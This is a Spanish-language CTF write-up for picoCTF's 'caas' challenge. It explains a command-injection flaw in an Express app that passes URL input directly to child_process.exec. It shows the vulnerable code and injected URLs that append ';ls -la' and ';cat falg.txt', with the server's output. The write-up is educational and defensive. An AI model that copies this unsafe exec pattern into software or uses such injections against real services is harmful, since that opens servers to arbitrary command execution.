# Writeup: caas
**Categoría:** Medium
**Fecha de conversión:** 2026-05-04

---

Writeup: caas – Inyección de comandos en Cowsay as a Service

Título


¡La vaca habla y ejecuta comandos!

Descripción del reto


Nos dan acceso a un servicio web llamado caas (Cowsay as a Service). La página toma un mensaje y lo muestra con el famoso programa cowsay. El código fuente index.js es el siguiente:

javascript


const express = require('express');

const app = express();

const { exec } = require('child_process');


app.use(express.static('public'));


app.get('/cowsay/:message', (req, res) => {

```
  exec(`/usr/games/cowsay ${req.params.message}`, {timeout: 5000}, (error, stdout) => {
    if (error) return res.status(500).end();
    res.type('txt').send(stdout).end();
  });
```

});


app.listen(3000, () => {

```
  console.log('listening');
```

});


El objetivo es encontrar la bandera (flag) en el sistema.

Identificación de la vulnerabilidad


El código concatena directamente el parámetro message dentro del comando que se ejecuta con child_process.exec. No se realiza ningún filtrado o escape de caracteres especiales de shell (como ;, |, &, $(), etc.). Esto permite inyección de comandos: un atacante puede agregar comandos adicionales que el sistema ejecutará con los mismos privilegios que el servidor.

Explotación


La URL base es: https://caas.mars.picoctf.net/cowsay/

Paso 1: Listar el contenido del directorio actual


Para saber qué archivos hay, inyectamos ; ls -la después de un mensaje cualquiera (por ejemplo, kr3s4l4). En la URL, el punto y coma y el espacio deben codificarse como %3B y %20 respectivamente:

text


https://caas.mars.picoctf.net/cowsay/kr3s4l4;ls%20-la


El servidor responde con la salida de cowsay (para el mensaje kr3s4l4) y, a continuación, el listado de archivos:

text


< kr3s4l4 >

```
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

total 52

drwxr-xr-x  1 root root  4096 Jun 16  2021 .

drwxr-xr-x  1 root root  4096 May 14  2025 ..

-rw-r--r--  1 root root    14 May  5  2021 .dockerignore

-rw-r--r--  1 root root   278 May  5  2021 Dockerfile

-rw-r--r--  1 root root    73 May  5  2021 falg.txt

-rw-r--r--  1 root root   424 Jun 16  2021 index.js

drwxr-xr-x 52 root root  4096 May  5  2021 node_modules

-rw-r--r--  1 root root   135 May  5  2021 package.json

drwxr-xr-x  2 root root  4096 May  5  2021 public

-rw-r--r--  1 root root 14600 May  5  2021 yarn.lock


Observamos un archivo sospechoso llamado falg.txt (escrito incorrectamente, seguramente a propósito).

Paso 2: Leer el archivo falg.txt


Inyectamos ; cat falg.txt:

text


https://caas.mars.picoctf.net/cowsay/kr3s4l4;cat%20falg.txt


Respuesta del servidor:

text


```
 _________
```

< kr3s4l4 >

```
 ---------
        \   ^__^
         \  (oo)\_______
            (__)\       )\/\
                ||----w |
                ||     ||
```

picoCTF{******************************************}


Lección aprendida


Nunca se debe concatenar entrada del usuario directamente en un comando de sistema. En su lugar, se deben usar funciones que separen los argumentos (como execFile o spawn) o aplicar un escape riguroso. Este tipo de vulnerabilidad (inyección de comandos) es crítica y fácil de explotar, como se ha demostrado.

